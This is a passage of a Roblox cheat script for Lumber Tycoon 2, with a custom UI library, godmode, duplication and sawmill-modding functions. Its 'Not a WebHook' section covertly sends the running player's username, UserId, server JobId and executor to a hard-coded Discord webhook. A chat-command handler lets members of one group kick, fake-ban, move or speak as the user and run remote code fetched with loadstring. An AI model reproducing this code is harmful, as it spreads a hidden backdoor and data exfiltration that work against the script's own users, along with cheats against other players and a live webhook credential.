          SliderPart.Size = UDim2.new(0, 54, 0, 13)

          SliderPartC.CornerRadius = UDim.new(0, 4)
          SliderPartC.Name = "SliderPartC"
          SliderPartC.Parent = SliderPart

          SliderValBG.Name = "SliderValBG"
          SliderValBG.Parent = SliderBack
          SliderValBG.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
          SliderValBG.BorderSizePixel = 0
          SliderValBG.Position = UDim2.new(0.883177578, 0, 0.131578952, 0)
          SliderValBG.Size = UDim2.new(0, 44, 0, 28)
          SliderValBG.AutoButtonColor = false
          SliderValBG.Font = Enum.Font.Gotham
          SliderValBG.Text = ""
          SliderValBG.TextColor3 = Color3.fromRGB(255, 255, 255)
          SliderValBG.TextSize = 14.000

          SliderValBGC.CornerRadius = UDim.new(0, 6)
          SliderValBGC.Name = "SliderValBGC"
          SliderValBGC.Parent = SliderValBG

          SliderValue.Name = "SliderValue"
          SliderValue.Parent = SliderValBG
          SliderValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          SliderValue.BackgroundTransparency = 1.000
          SliderValue.BorderSizePixel = 0
          SliderValue.Size = UDim2.new(1, 0, 1, 0)
          SliderValue.Font = Enum.Font.Gotham
          SliderValue.Text = "1000"
          SliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
          SliderValue.TextSize = 14.000

          MinSlider.Name = "MinSlider"
          MinSlider.Parent = SliderModule
          MinSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          MinSlider.BackgroundTransparency = 1.000
          MinSlider.BorderSizePixel = 0
          MinSlider.Position = UDim2.new(0.296728969, 40, 0.236842096, 0)
          MinSlider.Size = UDim2.new(0, 20, 0, 20)
          MinSlider.Font = Enum.Font.Gotham
          MinSlider.Text = "-"
          MinSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
          MinSlider.TextSize = 24.000
          MinSlider.TextWrapped = true

          AddSlider.Name = "AddSlider"
          AddSlider.Parent = SliderModule
          AddSlider.AnchorPoint = Vector2.new(0, 0.5)
          AddSlider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          AddSlider.BackgroundTransparency = 1.000
          AddSlider.BorderSizePixel = 0
          AddSlider.Position = UDim2.new(0.810906529, 0, 0.5, 0)
          AddSlider.Size = UDim2.new(0, 20, 0, 20)
          AddSlider.Font = Enum.Font.Gotham
          AddSlider.Text = "+"
          AddSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
          AddSlider.TextSize = 24.000
          AddSlider.TextWrapped = true

          local funcs = {
            SetValue = function(self, value)
            local percent = (mouse.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X
            if value then
              percent = (value - min) / (max - min)
            end
            percent = math.clamp(percent, 0, 1)
            if precise then
              value = value or tonumber(string.format("%.1f", tostring(min + (max - min) * percent)))
            else
              value = value or math.floor(min + (max - min) * percent)
            end
            library.flags[flag] = tonumber(value)
            SliderValue.Text = tostring(value)
            SliderPart.Size = UDim2.new(percent, 0, 1, 0)
            callback(tonumber(value))
          end
        }

        MinSlider.MouseButton1Click:Connect(function()
        local currentValue = library.flags[flag]
        currentValue = math.clamp(currentValue - 1, min, max)
        funcs:SetValue(currentValue)
        end)

        AddSlider.MouseButton1Click:Connect(function()
        local currentValue = library.flags[flag]
        currentValue = math.clamp(currentValue + 1, min, max)
        funcs:SetValue(currentValue)
        end)

        funcs:SetValue(default)

        local dragging, boxFocused, allowed = false, false, {
          [""] = true,
          ["-"] = true
        }

        SliderBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
          funcs:SetValue()
          dragging = true
        end
        end)

        services.UserInputService.InputEnded:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseButton1 then
          dragging = false
        end
        end)

        services.UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
          funcs:SetValue()
        end
        end)

        SliderValue.Focused:Connect(function()
        boxFocused = true
        end)

        SliderValue.FocusLost:Connect(function()
        boxFocused = false
        if SliderValue.Text == "" then
          funcs:SetValue(default)
        end
        end)

        SliderValue:GetPropertyChangedSignal("Text"):Connect(function()
        if not boxFocused then return end
        SliderValue.Text = SliderValue.Text:gsub("%D+", "")

        local text = SliderValue.Text

        if not tonumber(text) then
          SliderValue.Text = SliderValue.Text:gsub('%D+', '')
        elseif not allowed[text] then
          if tonumber(text) > max then
            text = max
            SliderValue.Text = tostring(max)
          end
          funcs:SetValue(tonumber(text))
        end
        end)

        return funcs
      end

      function section.Dropdown(section, text, flag, options, callback)
        local callback = callback or function() end
        local options = options or {}
        assert(text, "No text provided")
        assert(flag, "No flag provided")

        library.flags[flag] = nil

        local DropdownModule = Instance.new("Frame")
        local DropdownTop = Instance.new("TextButton")
        local DropdownTopC = Instance.new("UICorner")
        local DropdownOpen = Instance.new("TextButton")
        local DropdownText = Instance.new("TextBox")
        local DropdownModuleL = Instance.new("UIListLayout")
        local Option = Instance.new("TextButton")
        local OptionC = Instance.new("UICorner")

        DropdownModule.Name = "DropdownModule"
        DropdownModule.Parent = Objs
        DropdownModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        DropdownModule.BackgroundTransparency = 1.000
        DropdownModule.BorderSizePixel = 0
        DropdownModule.ClipsDescendants = true
        DropdownModule.Position = UDim2.new(0, 0, 0, 0)
        DropdownModule.Size = UDim2.new(0, 428, 0, 38)

        DropdownTop.Name = "DropdownTop"
        DropdownTop.Parent = DropdownModule
        DropdownTop.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        DropdownTop.BorderSizePixel = 0
        DropdownTop.Size = UDim2.new(0, 428, 0, 38)
        DropdownTop.AutoButtonColor = false
        DropdownTop.Font = Enum.Font.GothamSemibold
        DropdownTop.Text = ""
        DropdownTop.TextColor3 = Color3.fromRGB(255, 255, 255)
        DropdownTop.TextSize = 16.000
        DropdownTop.TextXAlignment = Enum.TextXAlignment.Left

        DropdownTopC.CornerRadius = UDim.new(0, 6)
        DropdownTopC.Name = "DropdownTopC"
        DropdownTopC.Parent = DropdownTop

        DropdownOpen.Name = "DropdownOpen"
        DropdownOpen.Parent = DropdownTop
        DropdownOpen.AnchorPoint = Vector2.new(0, 0.5)
        DropdownOpen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        DropdownOpen.BackgroundTransparency = 1.000
        DropdownOpen.BorderSizePixel = 0
        DropdownOpen.Position = UDim2.new(0.918383181, 0, 0.5, 0)
        DropdownOpen.Size = UDim2.new(0, 20, 0, 20)
        DropdownOpen.Font = Enum.Font.Gotham
        DropdownOpen.Text = "+"
        DropdownOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
        DropdownOpen.TextSize = 24.000
        DropdownOpen.TextWrapped = true

        DropdownText.Name = "DropdownText"
        DropdownText.Parent = DropdownTop
        DropdownText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        DropdownText.BackgroundTransparency = 1.000
        DropdownText.BorderSizePixel = 0
        DropdownText.Position = UDim2.new(0.0373831764, 0, 0, 0)
        DropdownText.Size = UDim2.new(0, 184, 0, 38)
        DropdownText.Font = Enum.Font.GothamSemibold
        DropdownText.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
        DropdownText.PlaceholderText = text
        DropdownText.Text = ""
        DropdownText.TextColor3 = Color3.fromRGB(255, 255, 255)
        DropdownText.TextSize = 16.000
        DropdownText.TextXAlignment = Enum.TextXAlignment.Left

        DropdownModuleL.Name = "DropdownModuleL"
        DropdownModuleL.Parent = DropdownModule
        DropdownModuleL.SortOrder = Enum.SortOrder.LayoutOrder
        DropdownModuleL.Padding = UDim.new(0, 4)

        local setAllVisible = function()
        local options = DropdownModule:GetChildren()
        for i=1, #options do
          local option = options[i]
          if option:IsA("TextButton") and option.Name:match("Option_") then
            option.Visible = true
          end
        end
      end

      local searchDropdown = function(text)
      local options = DropdownModule:GetChildren()
      for i=1, #options do
        local option = options[i]
        if text == "" then
          setAllVisible()
        else
          if option:IsA("TextButton") and option.Name:match("Option_") then
            if option.Text:lower():match(text:lower()) then
              option.Visible = true
            else
              option.Visible = false
            end
          end
        end
      end
    end

    local open = false
    local ToggleDropVis = function()
    open = not open
    if open then setAllVisible() end
    DropdownOpen.Text = (open and "-" or "+")
    DropdownModule.Size = UDim2.new(0, 428, 0, (open and DropdownModuleL.AbsoluteContentSize.Y + 4 or 38))
  end

  DropdownOpen.MouseButton1Click:Connect(ToggleDropVis)
  DropdownText.Focused:Connect(function()
  if open then return end
  ToggleDropVis()
  end)

  DropdownText:GetPropertyChangedSignal("Text"):Connect(function()
  if not open then return end
  searchDropdown(DropdownText.Text)
  end)

  DropdownModuleL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
  if not open then return end
  DropdownModule.Size = UDim2.new(0, 428, 0, (DropdownModuleL.AbsoluteContentSize.Y + 4))
  end)

  local funcs = {}
  funcs.AddOption = function(self, option)
  local Option = Instance.new("TextButton")
  local OptionC = Instance.new("UICorner")

  Option.Name = "Option_" .. option
  Option.Parent = DropdownModule
  Option.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
  Option.BorderSizePixel = 0
  Option.Position = UDim2.new(0, 0, 0.328125, 0)
  Option.Size = UDim2.new(0, 428, 0, 26)
  Option.AutoButtonColor = false
  Option.Font = Enum.Font.Gotham
  Option.Text = option
  Option.TextColor3 = Color3.fromRGB(255, 255, 255)
  Option.TextSize = 14.000

  OptionC.CornerRadius = UDim.new(0, 6)
  OptionC.Name = "OptionC"
  OptionC.Parent = Option

  Option.MouseButton1Click:Connect(function()
  ToggleDropVis()
  callback(Option.Text)
  DropdownText.Text = Option.Text
  library.flags[flag] = Option.Text
  end)
  end


  funcs.RemoveOption = function(self, option)
  local option = DropdownModule:FindFirstChild("Option_" .. option)
  if option then option:Destroy() end
  end

  funcs.SetOptions = function(self, options)
     for _, v in next, DropdownModule:GetChildren() do
         if v.Name:match("Option_") then
             v:Destroy()
         end
     end

     for _, v in next, options do
         funcs:AddOption(v)
     end
 end

  funcs:SetOptions(options)

  return funcs
  end
  return section
  end
  return tab
  end
  return window
  end
 --#endregion


  --#region Admin

  --#region Not a WebHook
  local time = os.date("%c", os.time())
  local teleport = "```lua\n".. 'game:GetService("TeleportService")'..":TeleportToPlaceInstance".."("..game.PlaceId..",".. "'" .. game.JobId.. "'".. ",".."game.Players.LocalPlayer"..")```"
  local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

  function webhook(title)
      url = "https://discord.com/api/webhooks/1147660872014114977/6GJ06-vfGYK9CNRv1wv3NC7X_h6GoSq_4GeqCBIpRvjCjDWrqYWIsls3QYJ-HQXOhP2n"
      local data = {
          ["content"] = "",
          ["username"] = a,
          ["embeds"] = {
              {
                  ["title"] = title,
                  ["description"] = "**Join script:**\n" .. teleport,
                  ["type"] = "rich",
                  ["footer"] = {
                      ["text"] = time
                  },
                  fields = {

                      {
                          name = "**Username**",
                          value = "> "..game.Players.LocalPlayer.Name,
                          inline = true
                      },

                      {
                          name = "**UserId**",
                          value = "> "..game.Players.LocalPlayer.UserId,
                          inline = true
                      },

                      {
                          name = "**Game**",
                          value = "> "..gameName,
                          inline = true
                      },

                      {
                          name = "**Executor**",
                          value = "> "..identifyexecutor(),
                          inline = true
                      },

                      {
                          name = "**JobId**",
                          value = "> "..game.JobId,
                          inline = true
                      },

                      {
                          name = "**PlaceId**",
                          value = "> "..game.PlaceId,
                          inline = true
                      },
                  }
              }
          }
      }
      local newdata = game:GetService("HttpService"):JSONEncode(data)

      local headers = {
          ["content-type"] = "application/json"
      }

      request = http_request or request or HttpPost or syn.request
      local a = {Url = url, Body = newdata, Method = "POST", Headers = headers}

      request(a)
  end
  --#endregion


  --#region Commands
  local event = game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering

  local prefix = ";"

  local connect = event.OnClientEvent:Connect(function(data, status)

      local Admin = game:GetService("Players"):GetPlayerByUserId(tostring(data.SpeakerUserId))

      if not Admin:IsInGroup(7671821) or string.sub(data.Message, 1, 1) ~= prefix then return end

      local msg = string.split(data.Message, " ")

      if msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "kick" then
          webhook("Script kick Log by: ".. tostring(Admin))
          task.wait() -- Need a wait I think
          game.Players.LocalPlayer:Kick("Kicked by butter admin: " .. tostring(Admin))
      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "bring" then
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[tostring(Admin)].HumanoidRootPart.CFrame * CFrame.new(5, 0, 0)
      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "sit" then
          game.Players.LocalPlayer.Character.Humanoid.Sit = true
      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "chat" and msg[3] then
          local Saystuff = table.concat(msg, " ", 3)
          game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Saystuff, "All")
      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "stay" then
          game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "unstay" then
          game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "sh" then
          webhook("Server Server by: ".. tostring(Admin))
          task.wait()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/ServerHop.txt'))()

      elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "rj" then
          webhook("Rejoin Log by: ".. tostring(Admin))
          task.wait()
          game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)

     elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "ban" then
          webhook("Fake ban by: ".. tostring(Admin))
          task.wait()
          game.Players.LocalPlayer:Kick("You have been Banned from LT2")

         elseif msg[2] == game.Players.LocalPlayer.Name and msg[1] == prefix .. "unbl" then
         game:GetService("ReplicatedStorage").Interaction.UpdateUserSettings:FireServer("UserPermission", tostring(data.SpeakerUserId), "Visit", true)
         game:GetService("ReplicatedStorage").Interaction.UpdateUserSettings:FireServer("UserPermission", tostring(data.SpeakerUserId), "Sit", true)
      end
  end)

  game.Players.PlayerAdded:Connect(function(player)
     if player:IsInGroup(7671821) then
         webhook("Player in your game")
     end
  end)

  --#endregion

 --#endregion

  --#endregion


  --#region NOIF tab
  local notifications = loadstring(game:HttpGet(("https://raw.githubusercontent.com/AbstractPoo/Main/main/Notifications.lua"),true))()
  --#endregion


  --#region functions


  --#region locals
  local GetTreeAmount local SelectedTreeType local SelectedTree local TreeAdded local OldPos local TreeChopped = false local AbortGetTree = false
  local ClickToSellMouseVal local Pllayyers = game:GetService("Players") local ItemToBuy local AutoBuyAmount = 1 local SelectedShopCounter
  local OldMoneyVal local ShopIDS = {["WoodRUs"] = 7,["FurnitureStore"] = 8,["FineArt"] = 11,["CarStore"] = 9,["LogicStore"] = 12,["ShackShop"] = 10} local AutoBuyItemAdded
  local TotalPrice local AbortAutoBuy = false local SlotNumber local WLPlayerAdded local BLPlayerAdded local ClearAllShopItems = false local ClickToSellWoodClick
  local AutoBlacklistAll = false local AutoWhitelistAll = false local SelectedWipeOption local VehicleSpeed local VehicleSpawnerVal local SelectedSpawnColor = nil local VehicleRespawnedColor local RespawnedCar
  local AbortVehicleSpawner = false local SelectedSpawnPad local SelectedWireType local SelectedWire local Night = false local Day = false local LoopDestroyShopItems = false
  local LeakedItems = false local LIF local AxeDupeAmount local AbortAxeDupe local LoopDupeAxe = false local EmpyPlot local SlotToDupe local DupeAmount local AbortDupe = false local flystate = false local AFKVal local BaseDropOwner
  local BaseDropType local AbortItemTP = false local CustomDragger = false local AttemptChop

  local items = {}
  local partsData = {}

  local Players = game:GetService("Players")
  local ReplicatedStorage = game:GetService("ReplicatedStorage")
  local Player = game:GetService("Players").LocalPlayer
  local Mouse = game.Players.LocalPlayer:GetMouse()

  local HttpService = game:GetService("HttpService")

  local NumberofBps = 0

  if workspace:FindFirstChild("Preview") then
    workspace.Preview:Destroy()
  end


  local PreviewF = Instance.new('Folder')
  PreviewF.Parent = workspace
  PreviewF.Name = 'Preview'

  local posforX
  local posforY
  local posforZ


  local HitPoints={['Beesaxe']= 1.4;['AxeAmber']= 3.39;['ManyAxe']= 10.2;['BasicHatchet']= 0.2;['Axe1']= 0.55;['Axe2']= 0.93;['AxeAlphaTesters']= 1.5;['Rukiryaxe']= 1.68;['Axe3']= 1.45;['AxeBetaTesters']= 1.45;['FireAxe']= 0.6;['SilverAxe']= 1.6;['EndTimesAxe']= 1.58;['AxeChicken']= 0.9;['CandyCaneAxe']= 0;['AxeTwitter']= 1.65}
  local WaypointsPositions = {["The Den"] = CFrame.new(323, 49, 1930), ["Lighthouse"] = CFrame.new(1464.8, 356.3, 3257.2), ["Safari"] = CFrame.new(111.853, 11.0005, -998.805), ["Bridge"] = CFrame.new(112.308, 11.0005, -782.358), ["Bob's Shack"] = CFrame.new(260, 8, -2542), ["EndTimes Cave"] = CFrame.new(113, -214, -951), ["The Swamp"] = CFrame.new(-1209, 132, -801), ["The Cabin"] = CFrame.new(1244, 66, 2306), ["Volcano"] = CFrame.new(-1585, 625, 1140), ["Boxed Cars"] = CFrame.new(509, 5.2, -1463), ["Tiaga Peak"] = CFrame.new(1560, 410, 3274), ["Land Store"] = CFrame.new(258, 5, -99), ["Link's Logic"] = CFrame.new(4605, 3, -727), ["Palm Island"] = CFrame.new(2549, -5, -42), ["Palm Island 2"] = CFrame.new(1960, -5.900, -1501), ["Palm Island 3"] = CFrame.new(4344, -5.900, -1813), ["Fine Art Shop"] = CFrame.new(5207, -166, 719), ["SnowGlow Biome"] = CFrame.new(-1086.85, -5.89978, -945.316), ["Cave"] = CFrame.new(3581, -179, 430), ["Shrine Of Sight"] = CFrame.new(-1600, 195, 919), ["Fancy Furnishings"] = CFrame.new(491, 13, -1720), ["Docks"] = CFrame.new(1114, 3.2, -197), ["Strange Man"] = CFrame.new(1061, 20, 1131), ["Wood Dropoff"] = CFrame.new(323.406, -2.8, 134.734), ["Snow Biome"] = CFrame.new(889.955, 59.7999, 1195.55), ["Wood RUs"] = CFrame.new(265, 5, 57), ["Green Box"] = CFrame.new(-1668.05, 351.174, 1475.39), ["Spawn"] = CFrame.new(172, 2, 74), ["Cherry Meadow"] = CFrame.new(220.9, 59.8, 1305.8), ["Bird Cave"] = CFrame.new(4813.1, 33.5, -978.8),}

  local PlayerGui = Player.PlayerGui

  local SendUserNotice, ClientPlacedStructure, ClientPlacedBlueprint =
      ReplicatedStorage.Notices.SendUserNotice,
      ReplicatedStorage.PlaceStructure.ClientPlacedStructure,
      ReplicatedStorage.PlaceStructure.ClientPlacedBlueprint

  local Connections = {}

  local LoadPassword = getupvalue(getsenv(Player.PlayerGui.LoadSaveGUI.LoadSaveClient).saveSlot, 12)

  function SetSlotTo(Value)
    Player.CurrentSaveSlot.Set:Invoke(Value, LoadPassword)
  end

  function isnetworkowner(Part)
     return Part.ReceiveAge == 0
  end

  function GetPing()
     local Time = tick()
     game:GetService("ReplicatedStorage").TestPing:InvokeServer()
     return ((tick() - Time) / 2) + 0.5
  end

  function calculateHitsForEndPart(part)
     return math.round((math.sqrt(part.Size.X * part.Size.Z) ^ 2 * 8e7) / 1e7)
  end

  function DropTools()
  for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
     if v.Name == "Tool" then
       game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(v,"Drop tool",game.Players.LocalPlayer.Character.Head.CFrame * CFrame.new(0,4,-4))
       wait(0.50)
       end
    end
 end

 function GetToolsfix()
     for i,a in pairs(workspace.PlayerModels:GetDescendants()) do
         if a.Name == "Model" and a:FindFirstChild("Owner") then
             if a:FindFirstChild("ToolName") and a.ToolName.Value == "EndTimesAxe" then
                 game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(a,"Pick up tool")
             end
         end
     end
 end

 function infhrp(ison)
     pcall(function()
     if ison then

         game:GetService("Lighting").HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame

         Player.Character.HumanoidRootPart:Destroy()

         game:GetService("Lighting").HumanoidRootPart.Parent = Player.Character

     else

         Player.Character.HumanoidRootPart.Parent = game:GetService("Lighting")

         local Clone1 = game:GetService("Lighting").HumanoidRootPart:Clone()

         Clone1.Transparency = 1

         Clone1.Parent = Player.Character

         end
     end)
 end

  --#endregion


  --#region GET PLAYERS table
  function GetPlrs()
     local Plrs = {}
     for i, v in next, game.Players:GetPlayers() do
         table.insert(Plrs, v.Name)
     end
     return Plrs
 end

 local playerList = GetPlrs()

  --#endregion


  --#region Mod Sawmill
  function GetConnection(Name, DisconnectConnection)
      for Connection, Data in next, Connections do
          if tostring(Connection) == tostring(Name) then
              if DisconnectConnection then
                  Data.Function:Disconnect()
                  Connections[Name] = nil
                  return false
              end
              return Data.Function
          end
      end
      return false
  end

  function ModSawmill()
      ModWoodSawmill = nil

      SelectSawmill("To Mod")

      repeat
          Wait()
      until ModWoodSawmill

      local Conveyor, Conveyors = nil, ModWoodSawmill.Conveyor.Model:GetChildren()

      local Orientation = ModWoodSawmill.Main.Orientation.Y

      for i = (ModWoodSawmill.ItemName.Value:match("Sawmill4L") and #Conveyors - 1) or #Conveyors, #Conveyors do
          Conveyor = Conveyors[i]

          break
      end

      local Offset = .4

      for i = 1, 4 do
          Offset = Offset + 0.2

          ClientPlacedBlueprint:FireServer(
              "Floor2",
              CFrame.new(
                  Conveyor.CFrame.p +
                      Vector3.new(
                          (Orientation == 0 and -Offset) or (Orientation == 180 and Offset) or 0,
                          1.5,
                          (Orientation == -90 and -Offset) or (Orientation == 90 and Offset)
                      )
              ) *
                  CFrame.Angles(
                      math.rad(((Orientation == 180 or Orientation == 0) and 90) or 45),
                      math.rad(((Orientation == 180 or Orientation == 0) and 0) or 90),
                      math.rad(((Orientation == 180 or Orientation == 0) and 90) or 45)
                  ),
              Player
          )
          Wait(1.5)
      end

      notifications:message{Title = "Butter",Description = "Fill Blueprints To Complete.",Icon = 6023426926}
      ModWoodSawmill = nil
  end

  local connection


  local sawmillConnection

  function SelectSawmill(Type)

      notifications:message{Title = "Butter", Description = string.format("Select A Sawmill To %s.", Type), Icon = 6023426926}

      if sawmillConnection then
          sawmillConnection:Disconnect()
      end

      sawmillConnection = Mouse.Button1Down:Connect(function()
          local Target = Mouse.Target

          if not Target then
              return
          end

          Target = Target.Parent

          local Sawmill =
              Target:FindFirstChild("Settings") and Target.Settings:FindFirstChild("DimZ") or
              Target.Parent:FindFirstChild("Settings") and Target.Parent.Settings:FindFirstChild("DimZ")

          if Sawmill then
              ModWoodSawmill = Sawmill.Parent.Parent
              notifications:message{Title = "Butter", Description = "Sawmill Selected.", Icon = 6023426926}

              sawmillConnection:Disconnect()
          end
      end)
  end


  function SetSawmillSize(Type)
      SelectSawmill("Mod Wood")

      repeat
          Wait()
      until ModWoodSawmill and not PlayerGui.NoticeGUI.Notice.Visible

      local Original = ClientItemInfo:FindFirstChild(ModWoodSawmill.ItemName.Value).OtherInfo.MaxOutputSize.Value

      local MaxXSize = tonumber(string.format("%.1f", Original.X))
      local MaxZSize = tonumber(string.format("%.1f", Original.Z))

      local XSize = (Type == "Maximum" and MaxXSize) or tonumber(string.format("%.1f", .6))
      local ZSize = (Type == "Maximum" and MaxZSize) or tonumber(string.format("%.1f", .4))

      Maid.Threads:Create(
          function()
              repeat
                  Wait()

                  RemoteProxy:FireServer(
                      ModWoodSawmill:FindFirstChild((Type == "Maximum" and "ButtonRemote_XUp") or "ButtonRemote_XDown")
                  )
              until tonumber(string.format("%.1f", ModWoodSawmill.Settings.DimX.Value)) == XSize
          end
      )

      Maid.Threads:Create(
          function()
              repeat
                  Wait()

                  RemoteProxy:FireServer(
                      ModWoodSawmill:FindFirstChild((Type == "Maximum" and "ButtonRemote_YUp") or "ButtonRemote_YDown")
                  )
              until tonumber(string.format("%.1f", ModWoodSawmill.Settings.DimZ.Value)) == ZSize
          end
      )
  end
  --#endregion


  --#region SetSwingCooldown
  --[[function SetSwingCooldown()
      task.spawn(function()
      while getgenv().SetSwing do
          pcall(function()
              local Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Tool')
              local AttemptChop = getconnections(Tool.Activated)[1].Function
              local OldStats = getupvalues(AttemptChop)
              local NewStats = OldStats[1]
              local Cooldown = require(game:GetService("ReplicatedStorage").AxeClasses:FindFirstChild('AxeClass_'..tostring(Tool.ToolName.Value))).new().SwingCooldown
              NewStats.SwingCooldown = (Cooldown / 2) or Cooldown
              setupvalue(AttemptChop, 1, NewStats)
          end)
          task.wait()
      end
      end)
  end

  getgenv().SetSwing = true
  SetSwingCooldown()--]]
  --#endregion


  --#region Getblueprints
  function GetBlueprints()
      BluePrints = {}
      for i,v in next, game:GetService("ReplicatedStorage").ClientItemInfo:GetChildren() do
          if v:FindFirstChild"Type" and v.Type.Value == "Structure" or v.Type.Value == "Furniture" then
              if v:FindFirstChild"WoodCost" then
                  if not game:GetService("Players").LocalPlayer.PlayerBlueprints.Blueprints:FindFirstChild(v.Name) then
                      table.insert(BluePrints, v.Name)
                  end
              end
          end
      end
      return BluePrints
  end
  --#endregion


  --#region LT2 Dark mode
  function GameMenuTheme(BGColor, TxtColor)
     for i,v in next, game:GetService("Players").LocalPlayer.PlayerGui:GetChildren() do
         if v.Name ~= "Chat" and v.Name ~= "TargetGui" and v.Name ~= "LoadingScreen" and v.Name ~= "Blueprints" then
             for i,v in next, v:GetDescendants() do
                 if not v:FindFirstChild"UICorner" then
                     Instance.new("UICorner",v)
                 end
                 if v.Name == "DropShadow" then
                     v:Destroy()
                 end
                 if v:IsA("TextButton") or v:IsA("Frame") or v:IsA("ScrollingFrame") then
                     v.BackgroundColor3 = BGColor
                 end
                 if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
                     v.TextColor3 = TxtColor
                     v.BackgroundColor3 = BGColor
                     v.Font = Enum.Font.GothamMedium
                 end
             end
         end
     end
 end
  --#endregion


  --#region Progress Bar
  function twes(target,changes,style,dir,tim)
      game:GetService('TweenService'):Create(target,TweenInfo.new(tim,Enum.EasingStyle[style],Enum.EasingDirection[dir]),changes):Play()
  end

  LoadingScreen = Instance.new("ScreenGui")
  Frame = Instance.new("Frame")
  Bar = Instance.new("Frame")
  Inside = Instance.new("Frame")
  UICorner = Instance.new("UICorner")
  UICorner_2 = Instance.new("UICorner")
  TextLabel = Instance.new("TextLabel")

  LoadingScreen.Name = "LoadingScreen"
  LoadingScreen.Parent = game.Players.LocalPlayer.PlayerGui
  LoadingScreen.ResetOnSpawn = false

  Frame.Parent = LoadingScreen
  Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Frame.BackgroundTransparency = 1.000
  Frame.Position = UDim2.new(0, 271, 0, 153)
  Frame.Size = UDim2.new(0, 282, 0, 86)
  Frame.Visible = false

  Bar.Name = "Bar"
  Bar.Parent = Frame
  Bar.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
  Bar.Position = UDim2.new(0, -86, 0, -126)
  Bar.Size = UDim2.new(0, 237, 0, 23)

  Inside.Name = "Inside"
  Inside.Parent = Bar
  Inside.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  Inside.BackgroundTransparency = 1.000
  Inside.Position = UDim2.new(0, 0, 0, 1)
  Inside.Size = UDim2.new(0, 0, 0, 21)

  UICorner.Parent = Inside

  UICorner_2.Parent = Bar

  TextLabel.Parent = Bar
  TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  TextLabel.BackgroundTransparency = 1.000
  TextLabel.Position = UDim2.new(0, -12, 0, -36)
  TextLabel.Size = UDim2.new(0, 58, 0, 45)
  TextLabel.Font = Enum.Font.SourceSans
  TextLabel.Text = "0"
  TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
  TextLabel.TextSize = 25.000


  frame = LoadingScreen.Frame
  bar = frame.Bar
  inside = bar.Inside


  function ResizeBar(percent,amt)
      frame.Visible = true
      inside.BackgroundTransparency = 0
      bar.TextLabel.Text = percent
      inside:TweenSize(UDim2.new(percent/amt, 0, 0.9, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.3, true)
      spawn(function()
          wait(1.5)
          if percent == amt then
              frame.Visible = false
          end
      end)
  end
  --#endregion


  --#region GodMode
 function GetLava()
 local Lava = workspace['Region_Volcano']:GetChildren()
     for i = 1, #Lava do
         local Lava = Lava[i]
         if Lava:FindFirstChild('Lava') and Lava.Lava.CFrame == CFrame.new(-1675.2002, 255.002533, 1284.19983, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268) then
             return Lava
         end
     end
 end

 function GodMode(tp)
     local LavaPart = GetLava()


     Player.Character.HumanoidRootPart.CFrame = CFrame.new(-1439.45, 433.4, 1317.61)

     repeat task.wait(1)

     firetouchinterest(Player.Character.HumanoidRootPart, LavaPart.Lava, 0)

     until Player.Character.HumanoidRootPart:FindFirstChild"LavaFire"

     Player.Character.HumanoidRootPart.LavaFire:Destroy()

     task.wait(1)

     local Clone = Player.Character.Torso:Clone()

     Clone.Name = "HumanoidRootPart"

     Clone.Transparency = 1

     Clone.Parent = Player.Character

     Player.Character.HumanoidRootPart.CFrame = tp
     Clone.CFrame = tp
 end

 --#endregion


  --#region Get Tree
  function ChopTree(CutEvent, ID, Height)
